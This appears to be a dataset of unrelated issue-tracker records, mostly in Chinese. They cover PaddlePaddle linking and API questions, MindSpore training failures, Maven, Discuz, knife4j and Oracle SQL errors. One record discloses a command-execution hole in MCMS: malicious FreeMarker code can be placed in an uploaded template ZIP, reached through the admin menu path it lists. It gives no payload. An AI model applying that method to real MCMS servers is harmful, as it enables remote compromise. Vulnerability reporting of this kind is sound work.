No need to link libraries multi-times,"When I use to build the current develop branch, I found some libraries are linked multi-times. On Mac, the linking detail: Linking times for each library: third party libraries libglog.a, 4 times libgflags.a, 4 times libopenblas.dylib, 2 times libprotobuf.a, 3 times libz.a, 2 times libpython2.7.dylib, 2 times libgtest.a, 1 time paddle libraries optimizer/libpaddle_optimizer.a, 2 times paddle/cuda/libpaddle_cuda.a, 2 times proto/libpaddle_proto.a, 2 times paddle/parameter/libpaddle_parameter.a, 2 times paddle/utils/libpaddle_utils.a, 2 times paddle/math/libpaddle_math.a, 2 times paddle/pserver/libpaddle_network.a, 2 times paddle/trainer/libpaddle_trainer_lib.a, 2 times paddle/pserver/libpaddle_pserver.a, 2 times paddle/function/libpaddle_function.a, 2 times paddle/gserver/libpaddle_gserver.a, 2 times paddle/testing/libpaddle_test_main.a, 1 time paddle/testing/libpaddle_test_util.a, 1 time The linking information of PR #4890:book02 mnist mlp training in new framework , all the paddle and third party libraries expect are only linked 1 time.   <code>: make VERBOSE=1 [ 43%] Linking CXX executable test_StringUtils cd /Users/liuyiqun01/work/github/Paddle/build_paddle/build/paddle/utils/tests &amp;&amp; /usr/local/Cellar/cmake/3.9.1/bin/cmake -E cmake_link_script CMakeFiles/test_StringUtils.dir/link.txt --verbose=1 /Applications/Xcode.app/Contents/Developer/usr/bin/g++ -mavx -std=c++11 -fPIC -fno-omit-frame-pointer -Wall -Wextra -Werror -Wnon-virtual-dtor -Wdelete-non-virtual-dtor -Wno-unused-parameter -Wno-unused-function -Wno-error=sign-compare -Wno-error=unused-local-typedefs -Wno-error=parentheses-equality -O3 -arch x86_64 -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.13.sdk -mmacosx-version-min=10.12 -Wl,-search_paths_first -Wl,-headerpad_max_install_names CMakeFiles/test_StringUtils.dir/test_StringUtils.cpp.o -o test_StringUtils ../../../../third_party/install/glog/lib/libglog.a ../../../../third_party/install/gflags/lib/libgflags.a -Wl,-force_load ../../gserver/libpaddle_gserver.a -Wl,-force_load ../../function/libpaddle_function.a ../../pserver/libpaddle_pserver.a ../../trainer/libpaddle_trainer_lib.a ../../pserver/libpaddle_network.a ../../math/libpaddle_math.a ../libpaddle_utils.a ../../parameter/libpaddle_parameter.a ../../../proto/libpaddle_proto.a ../../cuda/libpaddle_cuda.a ../../optimizer/libpaddle_optimizer.a ../../../../third_party/install/gflags/lib/libgflags.a ../../../../third_party/install/glog/lib/libglog.a /usr/local/opt/openblas/lib/libopenblas.dylib ../../../../third_party/install/protobuf/lib/libprotobuf.a ../../../../third_party/install/zlib/lib/libz.a /usr/lib/libpython2.7.dylib -undefined dynamic_lookup /usr/lib/libpython2.7.dylib ../../../../third_party/install/zlib/lib/libz.a ../../../../third_party/install/protobuf/lib/libprotobuf.a /usr/local/opt/openblas/lib/libopenblas.dylib ../../../../third_party/install/glog/lib/libglog.a ../../../../third_party/install/gflags/lib/libgflags.a ../../optimizer/libpaddle_optimizer.a ../../cuda/libpaddle_cuda.a ../../../proto/libpaddle_proto.a ../../parameter/libpaddle_parameter.a ../libpaddle_utils.a ../../math/libpaddle_math.a ../../pserver/libpaddle_network.a ../../trainer/libpaddle_trainer_lib.a ../../pserver/libpaddle_pserver.a ../../function/libpaddle_function.a ../../gserver/libpaddle_gserver.a ../../testing/libpaddle_test_main.a ../../testing/libpaddle_test_util.a ../../../../third_party/install/gtest/lib/libgtest.a ../../../../third_party/install/protobuf/lib/libprotobuf.a ../../../../third_party/install/glog/lib/libglog.a ../../../../third_party/install/gflags/lib/libgflags.a libprotobuf [ 46%] Linking CXX executable test_StringUtils cd /Users/liuyiqun01/work/github/Paddle/build_paddle/build/paddle/utils/tests &amp;&amp; /usr/local/Cellar/cmake/3.9.1/bin/cmake -E cmake_link_script CMakeFiles/test_StringUtils.dir/link.txt --verbose=1 /Applications/Xcode.app/Contents/Developer/usr/bin/g++ -mavx -std=c++11 -fPIC -fno-omit-frame-pointer -Wall -Wextra -Werror -Wnon-virtual-dtor -Wdelete-non-virtual-dtor -Wno-unused-parameter -Wno-unused-function -Wno-error=sign-compare -Wno-error=unused-local-typedefs -Wno-error=parentheses-equality -O3 -arch x86_64 -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.13.sdk -mmacosx-version-min=10.12 -Wl,-search_paths_first -Wl,-headerpad_max_install_names CMakeFiles/test_StringUtils.dir/test_StringUtils.cpp.o -o test_StringUtils -Wl,-force_load ../../gserver/libpaddle_gserver.a -Wl,-force_load ../../function/libpaddle_function.a ../../pserver/libpaddle_pserver.a ../../trainer/libpaddle_trainer_lib.a ../../pserver/libpaddle_network.a ../../math/libpaddle_math.a ../libpaddle_utils.a ../../parameter/libpaddle_parameter.a ../../../proto/libpaddle_proto.a ../../cuda/libpaddle_cuda.a ../../optimizer/libpaddle_optimizer.a ../../../../third_party/install/gflags/lib/libgflags.a ../../../../third_party/install/glog/lib/libglog.a /usr/local/opt/openblas/lib/libopenblas.dylib ../../../../third_party/install/protobuf/lib/libprotobuf.a ../../../../third_party/install/zlib/lib/libz.a /usr/lib/libpython2.7.dylib -undefined dynamic_lookup ../../testing/libpaddle_test_main.a ../../testing/libpaddle_test_util.a ../../../../third_party/install/gtest/lib/libgtest.a ../../../../third_party/install/protobuf/lib/libprotobuf.a"
MCMS存在命令执行漏洞【模板上传】,漏洞原因 MCMS 使用了 Freemarker 作为 视图框架，如果在渲染文件中存在恶意代码，可造成命令执行漏洞 MCMS 具有 上传模板功能，可以上传恶意的zip压缩包，上传一个新模板，在模板里面添加恶意代码，从而实现命令执行   <code>: 系统设置&gt;模板管理&gt;上传模板ZIP压缩包 系统设置&gt;应用设置 test mcms/index.do
fluid.global_scope().find_var 使用问题,"下面程序中， print(list(fluid.default_main_program().list_vars())) 可以正确输出所有变量。 但 print('v=', fluid.global_scope().find_var('fc.w_0')) 返回为None 执行 exe.run(fluid.default_startup_program()) 后有可以正常输出变量。 难道var缺省不在global_scope中？如果要求必须执行startup_program, 希望能在文档中明确说明这些变量的状态，以及什么函数是在 startup_program执行后才是可用的。 否则让人混淆。 另外如果内部状态不完整情况下调用find_var ，建议扔一个异常，而不是返回None。   <code>: def test_find_var(): input = fluid.layers.data(name='input', shape=[1], dtype='float32') fc = fluid.layers.fc(name='fc', input=input, size=10) loss = fluid.layers.reduce_sum(input=fc) print(list(fluid.default_main_program().list_vars())) #will output the vars print('v=', fluid.global_scope().find_var('fc.w_0')) #output None exe = fluid.Executor(fluid.CPUPlace()) exe.run(fluid.default_startup_program()) print('v=', fluid.global_scope().find_var('fc.w_0')) #output fc.w_0"
maven 依赖未找到,这2个maven依赖未找到，中央库中没有。   <code>: &lt;dependency&gt; &lt;groupId&gt;com.jflyfox&lt;/groupId&gt; &lt;artifactId&gt;jflyfox_jfinal&lt;/artifactId&gt; &lt;version&gt;2.1&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt; &lt;artifactId&gt;jsp-api&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.jflyfox&lt;/groupId&gt; &lt;artifactId&gt;jflyfox_base&lt;/artifactId&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;/dependency&gt;
[ST][MS/modelzoo][NET]【兼容性】[ASCEND910][fasterrcnn]训练失败,"网络fasterrcnn,1.9的脚本，在2.0上跑失败。 网络脚本应同时兼容1.9及2.0版本 / 硬件环境: /device ascend : -- MindSpore version :r2.0 B030 commit_id:dc366042 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph ms_modelzoo_fasterrcnn_train_check_loss_8p.py cd solution_test/remaining/test_scripts/mindspore/net/fasterrcnn/ pytest -s ms_modelzoo_fasterrcnn_train_check_loss_8p 网络fasterrcnn训练成功 走给安正气   <code>: Please check the given data type or shape: AI CORE: : (&lt;Tensor[Bool], (1280, 256, 7, 7)&gt;) -&gt; (&lt;Tensor[Bool], (1280, 256, 7, 7)&gt;) AI CPU: : (&lt;Tensor[Bool], (1280, 256, 7, 7)&gt;) -&gt; (&lt;Tensor[Bool], (1280, 256, 7, 7)&gt;) For more details, please refer to 'Kernel Select Failed' at https://www.mindspore.cnThe Function Call Stack:Corresponding code candidate: - In file /home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/fasterrcnn/test_ms_modelzoo_fasterrcnn_train_check_fps_1p/scripts/train/src/FasterRcnn/roi_a lign.py:176/ res = self.select(mask, roi_feats_t, res)/ In file /home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/fasterrcnn/test_ms_modelzoo_fasterrcnn_train_check_fps_1p/scripts/train/src/FasterRcnn/faste r_rcnn.py:336/ roi_feats = self.roi_align(rois,/ In file /home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/fasterrcnn/test_ms_modelzoo_fasterrcnn_train_check_fps_1p/scripts/train/src/network_define.p y:101/ loss1, loss2, loss3, loss4, loss5, loss6 = self._backbone(x, img_shape, gt_bboxe, gt_label, gt_num)/ In file /home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/fasterrcnn/test_ms_modelzoo_fasterrcnn_train_check_fps_1p/scripts/train/src/network_define.p y:145/ loss = self.network(x, img_shape, gt_bboxe, gt_label, gt_num)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py:101/ return self.network(*outputs)/ [CRITICAL] ME(194166:281473424019472,MainProcess):2022-11-25-03:11:12.604.818 [mindspore/dataset/engine/datasets.py:2831] Uncaught exception: Traceback (most recent call last): File ""train.py"", line 303, in &lt;module&gt; train_fasterrcnn() File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/fasterrcnn/test_ms_modelzoo_fasterrcnn_train_check_fps_1p/scripts/train/src/model_utils/moxing_ adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 276, in train_fasterrcnn model.train(config.epoch_size, dataset, callbacks=cb, sink_size=200) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1052, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 614, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 692, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 626, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 942, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 916, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1310, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) TypeError: Can not select a valid kernel info for [TransData] in AI CORE or AI CPU kernel info candidates list."
"[CT][MS][OP]""Lapack library not found"" occurred when execute test cases of lstsq and LuSolve operator.",": Ascend /device ascend : -- MindSpore version :master -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : test_lstsq_exception_dtype_input_20x10_20x8_float pytest -s -v test_lstsq.py::test_lstsq_exception_dtype_input_20x10_20x8_float pass   <code>: def test_lstsq_exception_dtype_input_20x10_20x8_float(): input_x = Tensor(np.random.randn(20, 10).astype(np.float32)) input_a = Tensor(np.random.randn(20, 8).astype(np.float16)) fact = LstsqMock(inputs=[input_x, input_a]) fact.loss = 0.0001 with pytest.raises(TypeError): &gt; fact.forward_cmp() E RuntimeError: gels : Lapack library not found in compile time E at ../aten/src/TH/generic/THLapack.cpp:31 ../share/ops/array/lstsq_ops.py:42: RuntimeError"
1.8版本的nllloss和torch的nllloss表现不完全一致,"torch的代码 <ol start=""3""> 【Existing Issues】/【存在的问题】 torch的结果是0，而1.8版本的mindspore报错 【Expected Result】【预期结果】 Please fill in the expected result   <code>: class loss_new(nn.Module): def __init__(self, classes, weight=None, size_average=True, ignore_index=255, norm=False, upper_bound=1.0): super(loss_new, self).__init__() self.num_classes = classes self.nll_loss = nn.NLLLoss2d(weight, size_average, ignore_index) def calculateWeights(self, target): hist = np.histogram(target.flatten(), range( self.num_classes + 1), normed=True)[0] return hist def forward(self, inputs, targets): target_cpu = targets.numpy() loss = 0.0 for i in range(0, inputs.shape[0]): weights = self.calculateWeights(target_cpu[i]) self.nll_loss.weight = torch.Tensor(weights) print(self.nll_loss.weight) loss += self.nll_loss(F.log_softmax(inputs[i].unsqueeze(0)), targets[i].unsqueeze(0)) return loss loss = loss_new(19) input1 = torch.tensor(np.ones((2, 19, 72, 72)).astype(""float32"")) target = torch.tensor(np.ones((2, 72, 72)).astype(""int64""))*255 output = loss(input1,target) print(""shuchu:"",output) mindspore的代码: class ImageBasedCrossEntropyLoss2d_new(nn.Cell): def __init__(self, classes, weight=None, size_average=True, ignore_index=255, norm=False, upper_bound=1.0): super(ImageBasedCrossEntropyLoss2d_new, self).__init__() self.num_classes = classes """"""NLLLoss的一个参数维度没写"""""" self.nll_loss = nn.NLLLoss(ignore_index= 255,reduction=""mean"") self.norm = norm self.upper_bound = upper_bound self.log_softmax = nn.LogSoftmax() def calculateWeights(self, target): hist, _ = np_new.histogram(target.flatten(), bins = 19, range=((0.0, 18.0)), density=True) print(hist) if self.norm: hist = ((hist != 0) * self.upper_bound * (1 / hist)) + 1 else: hist = ((hist != 0) * self.upper_bound * (1 - hist)) + 1 return hist def construct(self, inputs, targets): loss = 0.0 #loss_new = 0.0 targets_new = targets transpose = mindspore.ops.Transpose() inputs = transpose(inputs, (0, 2, 3, 1)) x_size = inputs.shape for i in range(0, x_size[0]): weights = self.calculateWeights(targets_new[i]) shape = (x_size[1] * x_size[2], x_size[3]) inputs_new = np_new.reshape(inputs[i], shape) shape_new = (x_size[1] * x_size[2]) target_new = np_new.reshape(targets[i], shape_new) print(weights) print(self.nll_loss(self.log_softmax(inputs_new), target_new)) loss += self.nll_loss(self.log_softmax(inputs_new), target_new) return loss loss1 = ImageBasedCrossEntropyLoss2d_new(19) input1 = mindspore.Tensor(np.ones((2, 19, 72, 72)).astype(""float32"")) mask = np.ones((2, 72, 72))*255 mask = mindspore.Tensor(mask) mask = mask.astype(mindspore.int32) output1 = loss1(input1, mask) print(output1)"
How does Validloader work?,"I found that class reads files from the dataset using function from the class. Can anybody explain to me how this works, especially what do these three lines do:   <code>: LJSpeech wav _get_example Dataset validloader = DataCargo(validset, batch_size=1, shuffle=False) validreader = fluid.io.PyReader(capacity=20, return_list=True) validreader.decorate_batch_generator(validloader, place) class Dataset(ljspeech.LJSpeech): def __init__(self, config): super(Dataset, self).__init__(config.root) self.config = config def _get_example(self, metadatum): fname, _, _ = metadatum wav_path = os.path.join(self.root, ""wavs"", fname + "".wav"") loaded_sr, audio = read(wav_path) assert loaded_sr == self.config.sample_rate return audio class LJSpeech: def __init__(self, config, nranks, rank): place = fluid.CUDAPlace(rank) if config.use_gpu else fluid.CPUPlace() # Whole LJSpeech dataset. ds = Dataset(config) # Split into train and valid dataset. indices = list(range(len(ds))) valid_indices = indices[:config.valid_size] # Valid dataset. validset = Subset(ds, valid_indices, valid=True) # Currently only support batch_size = 1 for valid loader. validloader = DataCargo(validset, batch_size=1, shuffle=False) validreader = fluid.io.PyReader(capacity=20, return_list=True) validreader.decorate_batch_generator(validloader, place) self.validloader = validreader"
我的马甲 2.4”插件无法解除锁定马甲的解决方法,BUG描述：在 Discuz! X后台-应用-我的马甲-设置 中锁定某个马甲后，无法执行解锁操作。 解决办法： 打开 source/plugin/myrepeats/admincp.inc.php 文件，查找： 替换为：   <code>: $lock = $myrepeat['lock']; $lock = $myrepeat[0]['locked'];
knife4j无法生成完整的响应说明,"响应基类 接口 TsLottery类 但返回结果是这样的 page是源码无法修改，但TsLottery里面有@apiModel   <code>: @ApiModel public class ViewResult&lt;T&gt; { @ApiModelProperty(""返回码"") private Integer code; @ApiModelProperty(""返回说明"") private String msg; @ApiModelProperty(""返回数据"") private T data; public Integer getCode() { return code; } public void setCode(Integer code) { this.code = code; } public String getMsg() { return msg; } public void setMsg(String msg) { this.msg = msg; } public T getData() { return data; } public void setData(T data) { this.data = data; } public ViewResult(){ } public ViewResult(Integer code) { this.code = code; } public ViewResult(Integer code, String msg) { this.code = code; this.msg = msg; } public ViewResult(Integer code, String msg, T data) { this.code = code; this.msg = msg; this.data = data; } public static ViewResult success() { return new ViewResult(HttpStatus.SUCCESS, ""成功""); } public static ViewResult success(Object data) { return new ViewResult(HttpStatus.SUCCESS, ""成功"", data); } public static ViewResult success(Integer code, String msg, Object data) { return new ViewResult(code, msg, data); } public static ViewResult success(Integer code, String msg) { return new ViewResult(code, msg); } } @GetMapping(""xxxx"") @ApiOperation(""xxxxx"") public ViewResult&lt;Page&lt;TsLottery&gt;&gt; getLotteryListPage(LotteryQueryParam param){ return ViewResult.success(lotteryService.getLotteryPage(param)); } @ApiModel @TableName(value = ""ts_lottery"") public class TsLottery { @TableId(value = ""id"", type = IdType.AUTO) private Integer id; /** * 抽奖活动名称 */ @TableField(value = ""lottery_name"") @ApiModelProperty(""抽奖活动名称"") private String lotteryName; /** * 活动描述 */ @TableField(value = ""lottery_desc"") @ApiModelProperty(""活动描述"") private String lotteryDesc; /** * 抽奖时间 */ @TableField(value = ""lottery_datetime"") @JsonFormat(pattern = ""yyyy-MM-dd HH:mm:ss"") @ApiModelProperty(""抽奖时间"") private Date lotteryDatetime; /** * 奖品数量 */ @TableField(value = ""prize_number"") @ApiModelProperty(""奖品数量"") private Integer prizeNumber; /** * 参与人数 */ @TableField(value = ""participant_number"") @ApiModelProperty(""参与人数"") private Integer participantNumber; /** * 是否有效 */ @TableField(value = ""`valid`"") private Boolean valid; /** * 创建人 */ @TableField(value = ""create_by"") private String createBy; /** * 创建时间 */ @TableField(value = ""create_time"") private Date createTime; /** * 更新人 */ @TableField(value = ""update_by"") private String updateBy; /** * 更新时间 */ @TableField(value = ""update_time"") private Date updateTime; /** * @return id */ public Integer getId() { return id; } /** * @param id */ public void setId(Integer id) { this.id = id; } /** * 获取抽奖活动名称 * * @return lottery_name - 抽奖活动名称 */ public String getLotteryName() { return lotteryName; } /** * 设置抽奖活动名称 * * @param lotteryName 抽奖活动名称 */ public void setLotteryName(String lotteryName) { this.lotteryName = lotteryName; } /** * 获取活动描述 * * @return lottery_desc - 活动描述 */ public String getLotteryDesc() { return lotteryDesc; } /** * 设置活动描述 * * @param lotteryDesc 活动描述 */ public void setLotteryDesc(String lotteryDesc) { this.lotteryDesc = lotteryDesc; } /** * 获取抽奖时间 * * @return lottery_datetime - 抽奖时间 */ public Date getLotteryDatetime() { return lotteryDatetime; } /** * 设置抽奖时间 * * @param lotteryDatetime 抽奖时间 */ public void setLotteryDatetime(Date lotteryDatetime) { this.lotteryDatetime = lotteryDatetime; } /** * 获取奖品数量 * * @return prize_number - 奖品数量 */ public Integer getPrizeNumber() { return prizeNumber; } /** * 设置奖品数量 * * @param prizeNumber 奖品数量 */ public void setPrizeNumber(Integer prizeNumber) { this.prizeNumber = prizeNumber; } /** * 获取参与人数 * * @return participant_number - 参与人数 */ public Integer getParticipantNumber() { return participantNumber; } /** * 设置参与人数 * * @param participantNumber 参与人数 */ public void setParticipantNumber(Integer participantNumber) { this.participantNumber = participantNumber; } public Boolean getValid() { return valid; } public void setValid(Boolean valid) { this.valid = valid; } /** * 获取创建人 * * @return create_by - 创建人 */ public String getCreateBy() { return createBy; } /** * 设置创建人 * * @param createBy 创建人 */ public void setCreateBy(String createBy) { this.createBy = createBy; } /** * 获取创建时间 * * @return create_time - 创建时间 */ public Date getCreateTime() { return createTime; } /** * 设置创建时间 * * @param createTime 创建时间 */ public void setCreateTime(Date createTime) { this.createTime = createTime; } /** * 获取更新人 * * @return update_by - 更新人 */ public String getUpdateBy() { return updateBy; } /** * 设置更新人 * * @param updateBy 更新人 */ public void setUpdateBy(String updateBy) { this.updateBy = updateBy; } /** * 获取更新时间 * * @return update_time - 更新时间 */ public Date getUpdateTime() { return updateTime; } /** * 设置更新时间 * * @param updateTime 更新时间 */ public void setUpdateTime(Date updateTime) { this.updateTime = updateTime; } }"
error using bpr_loss operator,"I'm new to paddle. When I'm using bpr_loss operator in the following code snippet: I get this erorr and call stack: I installed paddle from source with CPU only option and my OS is ubuntu-16 I would like to know where I'm doing wrong? thanks in advance!   <code>: ipt = fluid.layers.data(name=""data"", shape=[2,2], dtype=""int16"") lbl = fluid.layers.data(name=""lb"", shape = [2,1], dtype=""int16"") cost = fluid.layers.bpr_loss(input=ipt, label=lbl) paddle.fluid.core.EnforceNotMet: Invoke operator bpr_loss error. Python Callstacks: File ""/usr/local/lib/python3.5/dist-packages/paddle/fluid/framework.py"", line 1317, in append_op attrs=kwargs.get(""attrs"", None)) File ""/usr/local/lib/python3.5/dist-packages/paddle/fluid/layer_helper.py"", line 56, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/usr/local/lib/python3.5/dist-packages/paddle/fluid/layers/nn.py"", line 1447, in bpr_loss outputs={'Y': [out]}) File ""local_test/bpr_loss.py"", line 27, in CASE0 cost = fluid.layers.bpr_loss(input=ipt, label=lbl) File ""local_test/bpr_loss.py"", line 11, in wrapper if func(): File ""local_test/bpr_loss.py"", line 49, in &lt;module&gt; CASE0() C++ Callstacks: Tensor holds the wrong type, it holds float at [/paddle/paddle/fluid/framework/tensor_impl.h:29]"
"Select和Insert正确, 进行update和delete操作时,一直报 ORA-00905: 缺失关键字错误,SQL在数据库运行正确","select 是正常的,一旦进行delete和update操作,就会报ORA-00905: 缺失关键字错误 mybatis-generator插件自动生成的update和delete语句,,我把SQL在数据库里运行了,是正常的,一旦在代码中就报错, 自己随便写一个简单的SQL也报错 比如 也是报错的.. 刚才又测了一下,写了一个固定的SQL,已经在数据库测过了,正常运行 放在代码里,调用,报一样的错误,缺少关键字   <code>: ### Error updating database. Cause: com.baomidou.mybatisplus.exceptions.MybatisPlusException: java.sql.SQLSyntaxErrorException: ORA-00905: 缺失关键字 ### The error may involve defaultParameterMap ### The error occurred while setting parameters ### Cause: com.baomidou.mybatisplus.exceptions.MybatisPlusException: java.sql.SQLSyntaxErrorException: ORA-00905: 缺失关键字 ] with root cause java.sql.SQLSyntaxErrorException: ORA-00905: 缺失关键字 at oracle.jdbc.driver.T4CTTIoer.processError(T4CTTIoer.java:450) at oracle.jdbc.driver.T4CTTIoer.processError(T4CTTIoer.java:399) at oracle.jdbc.driver.T4C8Oall.processError(T4C8Oall.java:1059) at oracle.jdbc.driver.T4CTTIfun.receive(T4CTTIfun.java:522) at oracle.jdbc.driver.T4CTTIfun.doRPC(T4CTTIfun.java:257) at oracle.jdbc.driver.T4C8Oall.doOALL(T4C8Oall.java:587) at oracle.jdbc.driver.T4CPreparedStatement.doOall8(T4CPreparedStatement.java:225) at oracle.jdbc.driver.T4CPreparedStatement.doOall8(T4CPreparedStatement.java:53) at oracle.jdbc.driver.T4CPreparedStatement.executeForRows(T4CPreparedStatement.java:943) at oracle.jdbc.driver.OracleStatement.doExecuteWithTimeout(OracleStatement.java:1150) at oracle.jdbc.driver.OraclePreparedStatement.executeInternal(OraclePreparedStatement.java:4798) at oracle.jdbc.driver.OraclePreparedStatement.executeQuery(OraclePreparedStatement.java:4845) at oracle.jdbc.driver.OraclePreparedStatementWrapper.executeQuery(OraclePreparedStatementWrapper.java:1501) at com.alibaba.druid.pool.DruidPooledPreparedStatement.executeQuery(DruidPooledPreparedStatement.java:228) at com.baomidou.mybatisplus.plugins.SqlExplainInterceptor.sqlExplain(SqlExplainInterceptor.java:118) at com.baomidou.mybatisplus.plugins.SqlExplainInterceptor.intercept(SqlExplainInterceptor.java:86) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) at com.sun.proxy.$Proxy66.update(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:198) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) at com.sun.proxy.$Proxy38.update(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.update(SqlSessionTemplate.java:294) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:63) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) at com.sun.proxy.$Proxy44.updateTest(Unknown Source) at com.xayl.fg.service.impl.MsgServiceImpl.deleteMsgById(MsgServiceImpl.java:75) at com.xayl.fg.controller.MsgController.deleteMsgbyId(MsgController.java:64) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:872) at javax.servlet.http.HttpServlet.service(HttpServlet.java:661) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.xayl.fg.filter.RequestFilter.doFilterInternal(RequestFilter.java:50) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:197) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:504) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:650) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:790) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) &lt;update id=""updatePasswordByUserId""&gt; update INFO_USER iu set iu.PASSWORD = #{password,jdbcType=VARCHAR} where iu.USER_ID = #{userId,jdbcType=VARCHAR} &lt;/update&gt; update INFO_USER set PASSWORD = '12345678', PHONE = '13533333333' where USER_ID = '1'"
